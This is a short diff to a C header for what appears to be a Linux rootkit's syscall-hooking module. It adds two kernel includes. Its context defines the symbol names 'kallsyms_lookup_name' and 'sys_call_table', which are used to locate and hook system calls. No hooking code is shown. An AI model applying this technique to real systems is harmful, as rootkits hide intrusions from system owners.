@@ -1,6 +1,10 @@
 #ifndef _ROOTKIT_HOOKING_H_
 #define _ROOTKIT_HOOKING_H_
 
+#include <asm/ptrace.h>
+#include <linux/types.h>
+
+
 #define KALLSYMS_NAME       "kallsyms_lookup_name"
 #define SYS_CALL_TABLE_NAME "sys_call_table"
 
